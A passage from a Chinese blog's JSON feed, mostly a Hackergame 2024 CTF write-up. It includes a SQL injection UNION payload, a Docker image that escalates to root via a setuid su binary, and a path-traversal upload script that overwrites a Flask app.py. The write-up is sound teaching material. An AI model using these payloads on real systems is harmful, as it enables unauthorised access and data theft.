https://data.maptiler.com/downloads/tileset/osm/ https://docs.protomaps.com/basemaps/maplibre https://www.maplibre.org/maplibre-gl-js/docs/examples/pmtiles/ ","permalink":"https://blog.sparktour.me/posts/2025/01/15/self-host-protomaps-tiles-server/","summary":"\u003ch2 id=\"前言\"\u003e前言\u003c/h2\u003e\n\u003cp\u003e笔者曾在三年前写过一篇如何self host基于OpenStreetmap数据的\u003ca href=\"https://blog.sparktour.me/posts/2021/08/03/self-host-openstreetmap-tiles-server/\"\u003e博客\u003c/a\u003e。在当时的文章里，笔者使用的后端是maptiler开发的的\u003ca href=\"https://github.com/maptiler/tileserver-gl\"\u003etileserver-gl\u003c/a\u003e。它需要一个转换好的mbtiles文件，才能正常serve地图。但遗憾的是，maptiler把下载转换好的地图作为一项商业服务提供，我们只能自己使用maptiler提供的\u003ca href=\"https://github.com/openmaptiles/openmaptiles\"\u003eopenmaptiles\u003c/a\u003e对地图进行转换。由于mbtiles的本质是基于sqlite的地图数据库，使用openmaptiles制作地图的速度相当缓慢（在一台48C256G的机器上转换全世界的地图大概需要一整天的时间，并且对磁盘的IO有较高的要求），host地图也需要使用tileserver-gl处理请求，将mbtiles里的数据转换成pbf格式发送给客户端。\u003c/p\u003e\n\u003cp\u003e直到最近，笔者注意到了一些GIS开源项目在使用的\u003ca href=\"https://docs.protomaps.com/\"\u003eProtomaps\u003c/a\u003e项目，以及他们提出的pmtiles格式。如Protomaps的发起人给博客起的标题《\u003ca href=\"https://protomaps.com/blog/dynamic-maps-static-storage/\"\u003eDynamic Maps, Static Storage\u003c/a\u003e》那样，pmtiles的一大优势是如果不需要raster tiles，服务端不再需要安装任何软件，只需要一个“Static Storage”即可（无需任何后端软件对地图数据进行处理）。确切的说，一个支持\u003ca href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Range_requests\"\u003eHTTP Range\u003c/a\u003e的服务器。包括nginx，caddy等常见的web服务器和S3服务理论上都是支持这项特性的。\u003c/p\u003e","title":"自建OpenStreetmap地图瓦片服务：迁移mbtiles到pmtiles"},{"content":"所有照片按照时间排列，没有做过任何后期处理。这次使用了avif作为图片容器格式，或许能正确地在网上显示手机拍出来的HDR效果（可惜Android设备上显示AVIF溢出的问题过了一年也没人修）\n2024年1月，清晨的塘朗地铁站天桥 2024年2月，正午的维港 2024年3月，学校六号门口的小吃街。由于深圳放松了对小摊贩的管制，学校门口的「小吃街」商贩摊位自2024年起逐渐增多。 2024年4月，黄木岗地铁站，车站的站厅层很大，但暂时还未布置任何设施 2024年5月，一列和谐号驶过广深铁路 2024年6月，一栋住宅楼的外墙正在被刷新 2024年7月，飞机降落时看到的青马大桥 2024年8月，新旧CalTrain 2024年9月，红磡站旧月台上展出的MLR列车 2024年10月，正在建设的微电子学院工地 2024年11月，校园里的晚霞 2024年12月31日，校园里的日落 ","permalink":"https://blog.sparktour.me/posts/2024/12/31/2024-in-photos/","summary":"\u003cp\u003e\u003cem\u003e所有照片按照时间排列，没有做过任何后期处理。这次使用了avif作为图片容器格式，或许能正确地在网上显示手机拍出来的HDR效果（可惜Android设备上显示AVIF溢出的问题过了一年也\u003ca href=\"https://issues.chromium.org/issues/342520633\"\u003e没人修\u003c/a\u003e）\u003c/em\u003e\u003c/p\u003e","title":"照片里的2024"},{"content":"这是本人第五次参加USTC的hackergame了，本次的排名相比上次略有进步，进到了50名内。\nPaoluGPT 观察代码注意到了可能可以进行SQL注入：\ndef generate_search_payload(): # 构造搜索所有包含flag记录的payload # 使用group_concat将多条记录合并,用换行符分隔 payload = \u0026#34;\u0026#39; UNION SELECT \u0026#39;Flags\u0026#39;, group_concat(id || \u0026#39; | \u0026#39; || title || \u0026#39; | \u0026#39; || contents, char(10)) \u0026#34; payload += \u0026#34;FROM messages WHERE contents LIKE \u0026#39;%flag%\u0026#39; OR title LIKE \u0026#39;%flag%\u0026#39; -- \u0026#34; # URL编码 encoded_payload = urllib.parse.quote(payload) # 构造完整URL url = f\u0026#34;/view?conversation_id={encoded_payload}\u0026#34; return url 得到了一个如下的query：\n/view?conversation_id=%27%20UNION%20SELECT%20%27Flags%27%2C%20group_concat%28id%20%7C%7C%20%27%20%7C%20%27%20%7C%7C%20title%20%7C%7C%20%27%20%7C%20%27%20%7C%7C%20contents%2C%20char%2810%29%29%20FROM%20messages%20WHERE%20contents%20LIKE%20%27%25flag%25%27%20OR%20title%20LIKE%20%27%25flag%25%27%20--%20 在浏览器里粘贴进去得到的网页里搜索flag就能找到两个小题的flag了。\n强大的正则表达式 mod16 参考wikipedia的整除规则，做了一个匹配（只匹配了1，2，4，考虑到随机到四位数以下的概率很小）：\n千位数是偶数时，末三位能被16整除。 25万4176：千位数4是偶数，末三位176，能被16整除。 千位数是奇数时，末三位加8能被16整除。 3408：千位数3是奇数，末三位408＋8＝416，能被16整除。 末两位与其余位乘4相加，其结果能被16整除。 176：1×4＋76＝80，1168：11×4＋68＝112，两者都能被16整除。 末四位能被16整除。 15万7648：末四位7648能被16整除。 正则的简化版本 最后会得到一个很长的regex（因为穷举了10000以内可以被16整除的数）\n(0|1|2|3|4|5|6|7|8|9)*((0|2|4|6|8)(000|016|032|048|064|080|096|112|128|144|160|176|192|208|224|240|256|272|288|304|320|336|352|368|384|400|416|432|448|464|480|496|512|528|544|560|576|592|608|624|640|656|672|688|704|720|736|752|768|784|800|816|832|848|864|880|896|912|928|944|960|976|992)|(1|3|5|7|9)(008|024|040|056|072|088|104|120|136|152|168|184|200|216|232|248|264|280|296|312|328|344|360|376|392|408|424|440|456|472|488|504|520|536|552|568|584|600|616|632|648|664|680|696|712|728|744|760|776|792|808|824|840|856|872|888|904|920|936|952|968|984)|0000|0016|0032|0048|0064|0080|0096|0112|0128|0144|0160|0176|0192|0208|0224|0240|0256|0272|0288|0304|0320|0336|0352|0368|0384|0400|0416|0432|0448|0464|0480|0496|0512|0528|0544|0560|0576|0592|0608|0624|0640|0656|0672|0688|0704|0720|0736|0752|0768|0784|0800|0816|0832|0848|0864|0880|0896|0912|0928|0944|0960|0976|0992|1008|1024|1040|1056|1072|1088|1104|1120|1136|1152|1168|1184|1200|1216|1232|1248|1264|1280|1296|1312|1328|1344|1360|1376|1392|1408|1424|1440|1456|1472|1488|1504|1520|1536|1552|1568|1584|1600|1616|1632|1648|1664|1680|1696|1712|1728|1744|1760|1776|1792|1808|1824|1840|1856|1872|1888|1904|1920|1936|1952|1968|1984|2000|2016|2032|2048|2064|2080|2096|2112|2128|2144|2160|2176|2192|2208|2224|2240|2256|2272|2288|2304|2320|2336|2352|2368|2384|2400|2416|2432|2448|2464|2480|2496|2512|2528|2544|2560|2576|2592|2608|2624|2640|2656|2672|2688|2704|2720|2736|2752|2768|2784|2800|2816|2832|2848|2864|2880|2896|2912|2928|2944|2960|2976|2992|3008|3024|3040|3056|3072|3088|3104|3120|3136|3152|3168|3184|3200|3216|3232|3248|3264|3280|3296|3312|3328|3344|3360|3376|3392|3408|3424|3440|3456|3472|3488|3504|3520|3536|3552|3568|3584|3600|3616|3632|3648|3664|3680|3696|3712|3728|3744|3760|3776|3792|3808|3824|3840|3856|3872|3888|3904|3920|3936|3952|3968|3984|4000|4016|4032|4048|4064|4080|4096|4112|4128|4144|4160|4176|4192|4208|4224|4240|4256|4272|4288|4304|4320|4336|4352|4368|4384|4400|4416|4432|4448|4464|4480|4496|4512|4528|4544|4560|4576|4592|4608|4624|4640|4656|4672|4688|4704|4720|4736|4752|4768|4784|4800|4816|4832|4848|4864|4880|4896|4912|4928|4944|4960|4976|4992|5008|5024|5040|5056|5072|5088|5104|5120|5136|5152|5168|5184|5200|5216|5232|5248|5264|5280|5296|5312|5328|5344|5360|5376|5392|5408|5424|5440|5456|5472|5488|5504|5520|5536|5552|5568|5584|5600|5616|5632|5648|5664|5680|5696|5712|5728|5744|5760|5776|5792|5808|5824|5840|5856|5872|5888|5904|5920|5936|5952|5968|5984|6000|6016|6032|6048|6064|6080|6096|6112|6128|6144|6160|6176|6192|6208|6224|6240|6256|6272|6288|6304|6320|6336|6352|6368|6384|6400|6416|6432|6448|6464|6480|6496|6512|6528|6544|6560|6576|6592|6608|6624|6640|6656|6672|6688|6704|6720|6736|6752|6768|6784|6800|6816|6832|6848|6864|6880|6896|6912|6928|6944|6960|6976|6992|7008|7024|7040|7056|7072|7088|7104|7120|7136|7152|7168|7184|7200|7216|7232|7248|7264|7280|7296|7312|7328|7344|7360|7376|7392|7408|7424|7440|7456|7472|7488|7504|7520|7536|7552|7568|7584|7600|7616|7632|7648|7664|7680|7696|7712|7728|7744|7760|7776|7792|7808|7824|7840|7856|7872|7888|7904|7920|7936|7952|7968|7984|8000|8016|8032|8048|8064|8080|8096|8112|8128|8144|8160|8176|8192|8208|8224|8240|8256|8272|8288|8304|8320|8336|8352|8368|8384|8400|8416|8432|8448|8464|8480|8496|8512|8528|8544|8560|8576|8592|8608|8624|8640|8656|8672|8688|8704|8720|8736|8752|8768|8784|8800|8816|8832|8848|8864|8880|8896|8912|8928|8944|8960|8976|8992|9008|9024|9040|9056|9072|9088|9104|9120|9136|9152|9168|9184|9200|9216|9232|9248|9264|9280|9296|9312|9328|9344|9360|9376|9392|9408|9424|9440|9456|9472|9488|9504|9520|9536|9552|9568|9584|9600|9616|9632|9648|9664|9680|9696|9712|9728|9744|9760|9776|9792|9808|9824|9840|9856|9872|9888|9904|9920|9936|9952|9968|9984) mod13 在Stack Exchange上找到了这个答案，并且微调了一下，把生成的正则里的(0+)?换成了0*以满足题目的要求。\nfunction gen(b, base) { var states = nfa(b, base) for (var i = 0; i \u0026lt; states.length; i++) states = reduce(states, i); return states[0][0] != \u0026#39;phi\u0026#39; \u0026amp;\u0026amp; new RegExp(\u0026#39;^\u0026#39; + wrap(states[0][0]) + \u0026#39;$\u0026#39;); } function test(reg, base) { if (!base) base = 10; var x = []; for (var i = 0; i \u0026lt; 100; i++) x.push(i); return x.map(function (a) {return a.toString(base)}).filter(reg.test.bind(reg)).map(function (a) {return parseInt(a, base)}) } function nfa(b, base) { if (!base) base = 10; var states = []; for (var i = 0; i \u0026lt; b; i++) { states[i] = []; for (var j = 0; j \u0026lt; b; j++) states[i][j] = []; } for (var i = 0; i \u0026lt; b; i++) for (var n = 0; n \u0026lt; base; n++) states[i][(i * base + n) % b].push(n.toString()); for (var i = 0; i \u0026lt; b; i++) for (var j = 0; j \u0026lt; b; j++) states[i][j] = states[i][j].length \u0026gt; 1 ? \u0026#39;[\u0026#39; + states[i][j].join(\u0026#39;\u0026#39;) + \u0026#39;]\u0026#39; : (states[i][j][0] || \u0026#39;phi\u0026#39;); return states; } // http://www.cs.umbc.edu/~squire/cs451_l7.html function reduce(states, n) { var s = states.length; var reduced = []; for (var i = 0; i \u0026lt; s; i++) { reduced[i] = []; for (var j = 0; j \u0026lt; s; j++) { // reduced[i][j] = wrap(states[i][n] + wrap(states[n][n]) + \u0026#39;*\u0026#39; + states[n][j] + \u0026#39;|\u0026#39; + states[i][j]); reduced[i][j] = \u0026#39;\u0026#39;; if (states[i][n] == \u0026#39;phi\u0026#39; || states[n][j] == \u0026#39;phi\u0026#39;) { reduced[i][j] = states[i][j]; continue; } if (states[i][n] != states[n][n]) reduced[i][j] += wrap(states[i][n]); if (states[n][n] != \u0026#39;phi\u0026#39;) { reduced[i][j] += wrap(states[n][n]); if (states[i][n] == states[n][n] \u0026amp;\u0026amp; states[n][j] == states[n][n]) reduced[i][j] += wrap(states[n][n]); if (states[i][n] == states[n][n] || states[n][j] == states[n][n]) reduced[i][j] += \u0026#39;+\u0026#39;; else reduced[i][j] += \u0026#39;*\u0026#39;; } if (states[n][j] != states[n][n]) reduced[i][j] += wrap(states[n][j]); reduced[i][j] = states[i][j] == \u0026#39;phi\u0026#39; ? wrap(reduced[i][j]) : alternate(reduced[i][j], states[i][j]); } } return reduced; } function matching(x, open, close) { // Test if the parens are actually matching if (\u0026#39;([\u0026#39;.indexOf(x.charAt(open)) != -1 \u0026amp;\u0026amp; \u0026#39;)]\u0026#39;.indexOf(x.charAt(close)) != -1) { var count = 0; for (var i = open; i \u0026lt;= close; i++) { if (\u0026#39;([\u0026#39;.indexOf(x.charAt(i)) != -1) count++; else if (\u0026#39;)]\u0026#39;.indexOf(x.charAt(i)) != -1) { count--; if (count == 0) return i == close; } } } return false; } function wrap(x) { if (x.length \u0026lt; 2 || matching(x, 0, x.length - 1)) return x; return \u0026#39;(\u0026#39; + x + \u0026#39;)\u0026#39;; } function optional(cond) { if (matching(cond, 0, cond.length - 2)) { var op = cond.charAt(cond.length - 1); if (op == \u0026#39;+\u0026#39;) return cond.slice(0, -1) + \u0026#39;*\u0026#39;; else if (op == \u0026#39;*\u0026#39; || op == \u0026#39;?\u0026#39;) return cond; } else if (matching(cond, 0, cond.length - 1)) return optional(cond.slice(1, -1)); return wrap(cond) + \u0026#39;?\u0026#39;; } function alternate(cond1, cond2) { cond2 = wrap(cond2); var index = cond1.indexOf(cond2); var len = cond2.length; var cond = \u0026#39;\u0026#39;; if (index == 0) { var op = cond1.charAt(len); if (op == \u0026#39;*\u0026#39;) cond = cond2 + \u0026#39;+\u0026#39; + optional(cond1.slice(len)); else if (op == \u0026#39;+\u0026#39;) cond = cond1; else cond = cond2 + optional(cond1.slice(len)); } else if (index == cond1.length - len) cond = optional(cond1.slice(0, index)) + cond2; else if (cond1.length == 1 \u0026amp;\u0026amp; cond2.length == 1) cond = \u0026#39;[\u0026#39; + cond1 + cond2 + \u0026#39;]\u0026#39;; else cond = cond1 + \u0026#39;|\u0026#39; + cond2; return wrap(cond); } regex = gen(13, 2) //regex (0+)? with 0* regex = regex.toString().replace(/\\(0\\+\\)/g, \u0026#39;0*\u0026#39;) //remove head /^ and tail $/ before use console.log(regex) flag{pow3rful_r3gular_expressi0n_medium_b696342189} 无法获得的秘密 vm只能用novnc访问，并且不能拖文件，也不能共享剪贴板，读取信息也只能通过屏幕，写入信息只能通过键盘输入和鼠标。首先我们可以思考一下如何利用vm里已有的软件。经过观察，除了常见的命令行软件，这个机器里有python，也有浏览器（意味着至少能运行python和javascript代码）。\n笔者在几周前正好看到过一位开发者开发过一个名为qrs的「网页传输数据」的包。这个包通过把文件编码进二维码，然后用喷泉码的方式把二维码显示在屏幕上来让屏幕另一边的「客户端」收取信息。笔者随即尝试把qrs的网页编译出来，去掉了图片（减小体积），压缩后base64。\nGZIP=-9 tar -czvf public.tar.gz public base64 -i public.tar.gz \u0026gt; public_b64.txt 156K Nov 2 20:33 public.tar.gz 209K Nov 2 20:33 public_b64.txt 这时这个base64后的文件大概有209k（大概20多万个字符），如果拿键盘宏输入的话每秒的输入速度大概要到300多个字符，这是正常的键盘宏做不到的。\n随后笔者注意到我可以直接往noVNC_keyboardinput里写入数据再发送，在保证novnc不卡死的情况下，大概每次能发送1万个字符（两次发送之间最好隔10秒左右，让缓冲区里的输入能够完全执行），因此在llm的辅助下写了以下的传输js（粘贴进浏览器的console即可使用）\nasync function appendToFile(text, chunkSize = 10000, pauseDuration = 10000) { const input = document.getElementById(\u0026#39;noVNC_keyboardinput\u0026#39;); if (!input) { console.error(\u0026#34;找不到键盘输入元素\u0026#34;); return; } // 计算总块数 const totalChunks = Math.ceil(text.length / chunkSize); console.log(`总共需要发送 ${totalChunks} 块数据，每块 ${chunkSize} 字符`); // 创建进度显示元素 const progressDiv = document.createElement(\u0026#39;div\u0026#39;); progressDiv.style.cssText = ` position: fixed; top: 10px; right: 10px; background: rgba(0, 0, 0, 0.8); color: white; padding: 10px; border-radius: 5px; font-family: monospace; z-index: 9999; `; document.body.appendChild(progressDiv); // 分块处理 for (let i = 0; i \u0026lt; text.length; i += chunkSize) { const chunk = text.slice(i, i + chunkSize); const currentChunk = Math.floor(i / chunkSize) + 1; // 更新进度显示 const progress = ((i + chunk.length) / text.length * 100).toFixed(2); progressDiv.innerHTML = ` 进度: ${progress}%\u0026lt;br\u0026gt; 当前块: ${currentChunk}/${totalChunks}\u0026lt;br\u0026gt; 已传输: ${i + chunk.length} / ${text.length} 字符`; // 构造echo命令 // 使用-n参数避免换行符，使用单引号避免特殊字符问题 const escapedChunk = chunk.replace(/\u0026#39;/g, \u0026#34;\u0026#39;\\\\\u0026#39;\u0026#39;\u0026#34;); const command = `echo -n \u0026#39;${escapedChunk}\u0026#39; \u0026gt;\u0026gt; 1.txt\\n`; // 发送命令 input.focus(); input.value = command; input.dispatchEvent(new Event(\u0026#39;input\u0026#39;, { bubbles: true, cancelable: true, })); // 清空输入框 await new Promise(resolve =\u0026gt; setTimeout(() =\u0026gt; { input.value = \u0026#39;\u0026#39;; resolve(); }, 100)); // 如果不是最后一块，则暂停 if (i + chunkSize \u0026lt; text.length) { // 显示倒计时 const startTime = Date.now(); const countDown = setInterval(() =\u0026gt; { const remainingTime = Math.ceil((pauseDuration - (Date.now() - startTime)) / 1000); if (remainingTime \u0026gt; 0) { progressDiv.innerHTML = ` 进度: ${progress}%\u0026lt;br\u0026gt; 当前块: ${currentChunk}/${totalChunks}\u0026lt;br\u0026gt; 已传输: ${i + chunk.length} / ${text.length} 字符\u0026lt;br\u0026gt; 等待下一块: ${remainingTime}秒`; } }, 1000); await new Promise(resolve =\u0026gt; setTimeout(() =\u0026gt; { clearInterval(countDown); resolve(); }, pauseDuration)); } } // 完成后显示验证命令 const verifyCommand = \u0026#34;wc -c 1.txt\\n\u0026#34;; input.focus(); input.value = verifyCommand; input.dispatchEvent(new Event(\u0026#39;input\u0026#39;, { bubbles: true, cancelable: true, })); // 也显示原始长度，方便比对 console.log(`原始字符串长度: ${text.length}`); // 等待3秒后移除进度显示 await new Promise(resolve =\u0026gt; setTimeout(resolve, 3000)); progressDiv.remove(); } // 使用方法： // 0. 首先清空或创建文件： // echo -n \u0026gt; 1.txt // 1. 然后开始传输： // appendToFile(你的base64字符串); 把网页传输进去之后，解码base64，解压出网页之后用python开个http服务器host网页即可：\nbase64 -d 1.txt \u0026gt; public.tar.gz tar -xvf public.tar.gz cd public python -m http.server 8000 打开网页启动二维码显示后，拿一个手机读大概2-3分钟就可以拿到数据了：\nDocker for Everyone Plus No Enough Privilege NOPASSWD: /usr/bin/docker run --rm -u 1000\\:1000 *, /usr/bin/docker image load, !/usr/bin/docker * -u0*, !/usr/bin/docker * -u?0*, !/usr/bin/docker * --user?0*, !/usr/bin/docker * -ur*, !/usr/bin/docker * -u?r*, !/usr/bin/docker * --user?r*, 在网上找到了这篇文章，作者提到了可以让docker里的用户用su提权到root，就可以干和docker run --rm之后一样的事情了。因此，我们制作一个简单的image：\nFROM busybox:latest # Create a new user RUN adduser -D -u 1000 user \u0026amp;\u0026amp; \\ # Set root password echo \u0026#34;root:root\u0026#34; | chpasswd \u0026amp;\u0026amp; \\ # Make sure su has correct permissions chmod u+s /bin/su # Switch to the new user USER user WORKDIR /home/user CMD [\u0026#34;/bin/sh\u0026#34;] 用rz传到题目环境里运行即可。\ndockerv:/tmp$ sudo docker run --rm -u 1000:1000 -v /flag:/flag -v /dev:/dev --pr ivileged --pid=host --cap-add=SYS_ADMIN reader_busybox1 whoami user dockerv:/tmp$ sudo docker run --rm -u 1000:1000 -it -v /flag:/flag -v /dev:/dev --privileged --pid=host --cap-add=SYS_ADMIN reader_busybox1 ~ $ su root Password: /home/user # cat /flag flag{dONT_1OAD_uNTRusT3D_1ma6e_253cb5a83d_plz!} ZFS 文件恢复 Text File 挂上盘之后可以先用zdb -vvv hg2024看一下盘的log，可以注意到创建zfs的人是用的zpool create -o ashift=9 -O atime=off -O compression=gzip -O redundant_metadata=none -O xattr=off hg2024 /dev/loop0创建的zpool，并且在删掉文件之前给盘打了一个快照hg2024/data@mysnap（2024-10-23.21:37:22 ioctl snapshot），之后参考这个issue，用zfs send -R hg2024/data@mysnap | zstream dump -d \u0026gt; zdump.txt，在zdump.txt里看能找到flag1。\n6c 75 61 69 78 6d 70 72 70 67 68 61 71 6a 66 6c luai xmpr pgha qjfl checksum = 2388d63a19/37aec6ae4719/393e10dd9e0ed3/2c106546000e7e31 WRITE object = 2 type = 19 checksum type = 2 compression type = 0 flags = 0 offset = 4096 logical_size = 4096 compressed_size = 0 payload_size = 4096 props = 0 salt = 0000000000000000 iv = 000000000000000000000000 mac = 00000000000000000000000000000000 61 67 7b 70 31 41 49 6e 4e 4e 6d 6d 6e 6e 6d 6d ag{p 1AIn NNmm nnmm 6e 74 45 78 78 74 5f 35 30 65 61 73 79 7e 72 31 ntEx xt_5 0eas y~r1 67 68 74 3f 7e 7d 0a 00 00 00 00 00 00 00 00 00 ght? ~}.. .... .... flag{p1AInNNmmnnmmntExxt_50easy~r1ght?~}\nShell Script 用dd if=/dev/loop0 bs=1M | strings -n 8提取整个盘的可读数据，可以发现这个脚本：\n#!/bin/sh flag_key=\u0026#34;hg2024_$(stat -c %X.%Y flag1.txt)_$(stat -c %X.%Y \u0026#34;$0\u0026#34;)_zfs\u0026#34; echo \u0026#34;46c518b175651d440771836987a4e7404f84b20a43cc18993ffba7a37106f508 -\u0026#34; \u0026gt; /tmp/sha256sum.txt printf \u0026#34;%s\u0026#34; \u0026#34;$flag_key\u0026#34; | sha256sum --check /tmp/sha256sum.txt || exit 1 printf \u0026#34;flag{snapshot_%s}\\n\u0026#34; \u0026#34;$(printf \u0026#34;%s\u0026#34; \u0026#34;$flag_key\u0026#34; | sha1sum | head -c 32)\u0026#34; 那目标就是找flag1文件的atime和mtime。我们再回去翻一下zdb -vvv hg2024的结果（大概在输出的1470行左右），可以看到object2和object3都比较可疑：\nObject lvl iblk dblk dsize dnsize lsize %full type 2 2 128K 4K 3.50K 512 8K 100.00 ZFS plain file 176 bonus System attributes dnode flags: USED_BYTES USERUSED_ACCOUNTED USEROBJUSED_ACCOUNTED dnode maxblkid: 1 uid 0 gid 0 atime\tThu Mar 9 23:56:50 2006 mtime\tSun May 29 03:49:29 1977 ctime\tWed Oct 23 21:37:22 2024 crtime\tWed Oct 23 21:37:22 2024 gen\t10 mode\t100644 size\t4135 parent\t34 links\t0 pflags\t840800000004 Object lvl iblk dblk dsize dnsize lsize %full type 3 1 128K 512 512 512 512 100.00 ZFS plain file 176 bonus System attributes dnode flags: USED_BYTES USERUSED_ACCOUNTED USEROBJUSED_ACCOUNTED dnode maxblkid: 0 uid 0 gid 0 atime\tMon Nov 10 04:49:03 2036 mtime\tSat Jan 12 01:18:00 2013 ctime\tWed Oct 23 21:37:22 2024 crtime\tWed Oct 23 21:37:22 2024 gen\t11 mode\t100755 size\t331 parent\t34 links\t0 pflags\t840800000104 我们试一下他们两的atime和mtime，结果发现就是对的flag2。flag_key是hg2024_1141919810.233696969_2109876543.1357924680_zfs（第一个文件的atime似乎有些恶趣味）\nflag{snapshot_6db0f20dd59a448d314cb9cabe8daea9}\nP.S 笔者一开始就只在看zdb的结果，结果先把第二道题做出来了（可能是因为flag1被gzip压缩了，明文里看不出来，但生成flag2的脚本没有被压缩），随后尝试了通过类似zdb -dddddd -N hg2024 2找出数据位置，然后用zdb -R hg2024 0:20e00:a00:dv等命令尝试去解码数据，但都一直都无法正确恢复数据（估计是因为不清楚压缩文件头的位置，所以zdb -R无法确认压缩的格式）。\nzdb -ddddddddd -N hg2024 2 Dataset mos [META], ID 0, cr_txg 4, 94.5K, 56 objects, rootbp DVA[0]=\u0026lt;0:b200:200\u0026gt; DVA[1]=\u0026lt;0:100b200:200\u0026gt; DVA[2]=\u0026lt;0:200c000:200\u0026gt; [L0 DMU objset] fletcher4 lz4 unencrypted LE contiguous unique triple size=1000L/200P birth=33L/33P fill=56 cksum=00000008eabfc621:000003ab22c39a45:0000c4a29aa8ceb5:001bf0cf206542e2 Object lvl iblk dblk dsize dnsize lsize %full type 2 1 16K 128K 3K 512 128K 100.00 SPA space map (K=inherit) (Z=inherit=on) 320 bonus SPA space map header dnode flags: USED_BYTES dnode maxblkid: 0 Indirect blocks: 0 L0 0:1c00:400 0:1001c00:400 0:2003400:400 20000L/400P F=1 B=29/29 cksum=000000892a449fd1:00003e8c652d74ab:00106e148054423c:0339284d35914fc7 segment [0000000000000000, 0000000000020000) size 128K 参考 https://serverfault.com/questions/378567/zfs-is-there-a-way-to-find-out-where-the-blocks-for-a-file-are-stored#1143030 https://openzfs.github.io/openzfs-docs/man/master/8/zdb.8.html#R https://github.com/openzfs/zfs/discussions/13326#discussioncomment-2695088 禁止内卷 这道题的关键是服务器的后端使用了flask run --reload --host 0命令运行，并开启了--reload选项，那如果有文件换掉了app.py那flask会马上应用新的脚本。观察评测的脚本，发现脚本直接把提交的文件存到了/tmp/uploads\u0026quot;里：\nfile = request.files[\u0026#39;file\u0026#39;] filename = file.filename filepath = os.path.join(UPLOAD_DIR, filename) file.save(filepath) 解决方案就是把上传的文件名改成软链接，这样上传的文件会直接覆盖掉/tmp/web/app.py，上传的文件就随意些写一个读取并返回answer.json的route即可。\nimport os import requests import json def create_and_upload_file(): # # 1. 创建一个看似正常的JSON文件 # payload = [0] * 50000 # 创建50000个0的数组 # filename = \u0026#34;payload.json\u0026#34; # # 将payload写入文件 # with open(filename, \u0026#39;w\u0026#39;) as f: # json.dump(payload, f) filename = \u0026#34;exp_ans.py\u0026#34; # 2. 上传文件 url = \u0026#34;https://chal02-selrm3q9.hack-challenge.lug.ustc.edu.cn:8443/submit\u0026#34; # 设置特殊的文件名，尝试创建软链接 files = { \u0026#39;file\u0026#39;: (\u0026#39;../../tmp/web/app.py\u0026#39;, open(filename, \u0026#39;rb\u0026#39;), \u0026#39;application/json\u0026#39;) } # 发送请求 response = requests.post(url, files=files) print(f\u0026#34;Status Code: {response.status_code}\u0026#34;) print(f\u0026#34;Response: {response.text}\u0026#34;) # # 3. 清理临时文件 # os.remove(filename) if __name__ == \u0026#34;__main__\u0026#34;: create_and_upload_file() exp_ans.py:\nfrom flask import Flask, jsonify import json app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;]) def index(): try: with open(\u0026#39;answers.json\u0026#39;, \u0026#39;r\u0026#39;) as f: answers = json.load(f) return jsonify({\u0026#34;answers\u0026#34;: answers}) except Exception as e: return jsonify({\u0026#34;error\u0026#34;: str(e)}) if __name__ == \u0026#39;__main__\u0026#39;: app.run() 解码数据：\ndef decode_flag(numbers): # 将每个数字加65然后转换为ASCII字符 flag = \u0026#39;\u0026#39; for num in numbers: char = chr(num + 65) flag += char return flag # 从响应中获取的数字 numbers = [37,43,32,38,58,52,45,46,-32,-32,-32,-32,30,36,50,49,36,53,36,49,30,45,46,54,30,20,30,49,52,45,30,12,24,30,34,-17,35,36,35,34,37,-8,33,32,-9,37,-15,37,60,11,25,73,78,25,46,78,45,68,55,60,96,44,13,53,62,80,14,88,70,33,8,33,41,94,35,8,99,51,90,49,14,38,3,13,40,91,57,28,99,51,27,42,41,56,71,85,45,1,39,42,92,2,25,62,6,13,35,64,71,13,98,66,30,90,12,73,70,56,92,71,43,81,75,84,9,10,61,10,9,16,47,32,60,76,73,66,76,93,44,38,38,25,8,38,31,17,15,19,65,33,32,14,66,21,46,30,62,18,19,74,14,77,62,66,40,44,80,71,53,39,22,100,90,71,79,17,65,32,70,43,83,45,63,40,53,68,6,89,36,45,27,28,68,53,30,56,54,96,35,61,44,90,11,63,29,87,60,22,50,97,98,2,70,10,0,82,50,64,12,87,8,50,69,44,58,1,96,20,93,92,83,14,67,44,19,49,86,82,54,65,67,68,24,39,75,18,97,22,49,69,24,36,71,13,9,12,69,11,55,2,89,7,30,43,80,92,28,3,78,1,11,6,6,72,94,17,92,57,26,10,14,91,44,9,18,22,81,42,28,8,73,28,66,80,41,15,77,77,90,84,8,1,66,99,39,27,3,83,36,8,1,11,23,64,90,69,64,94,15,6,29,1,52,45,89,88,80,95,44,33,34,5,17,65,15,63,11,54,71,83,49,71,100,74,97,45,56,79,28,31,94,77,92,29,46,70,87,8,69,64,42,42,52,96,84,43,82,11,45,16,77,3,1,15,19,74,34,100,4,95,25,17,20,29,57,62,12,47,96,46,17,69,9,47,4,57,39,65,39,30,12,17,22,44,24,59,84,35,73,66,56,92,61,73,77,10,78,85,66,13,14,28,41,80,68,7,44,34,20,23,67,81,91,62,25,67,67,78,72,29,42,10,15,68,95,55,57,63,49,82,44,8,62,90,4,49,87,5,57,23,88,39,25,56,7,55,74,99,74,48,83,29,84,65,29,15,10,76,4,79,56,6,80,70,48,48,15,93,41,55,49,50,0,47,35,84,96,77,89,87] # 解码并打印flag flag = decode_flag(numbers) print(f\u0026#34;Flag: {flag}\u0026#34;) # Flag: flag{uno!!!!_esrever_now_U_run_MY_c0dedcf9ba8f2f}LZ... 不太分布式的软总线 值得一提的是这道题是完全由LLM写的，没有任何人工干预，且LLM写出来的WP却是完全正确的。\nLLM（Claude）写的答案，未经任何修改 What DBus Gonna Do? 让我分析一下这道CTF题目。从代码中可以看出，这是一个基于DBus的系统服务，提供了三个获取flag的方法。我们先关注第一个flag。\n从flagserver.c的代码中可以看到获取flag1的方法是GetFlag1，它需要一个字符串参数，且该参数必须严格等于\u0026quot;Please give me flag1\u0026quot;。\n我们可以编写一个简单的C程序来调用这个DBus方法：\n#include \u0026lt;gio/gio.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #define DEST \u0026#34;cn.edu.ustc.lug.hack.FlagService\u0026#34; #define OBJECT_PATH \u0026#34;/cn/edu/ustc/lug/hack/FlagService\u0026#34; #define METHOD \u0026#34;GetFlag1\u0026#34; #define INTERFACE \u0026#34;cn.edu.ustc.lug.hack.FlagService\u0026#34; int main() { GError *error = NULL; GDBusConnection *connection; GVariant *result; // Connect to the system bus connection = g_bus_get_sync(G_BUS_TYPE_SYSTEM, NULL, \u0026amp;error); if (!connection) { g_printerr(\u0026#34;Failed to connect to the system bus: %s\\n\u0026#34;, 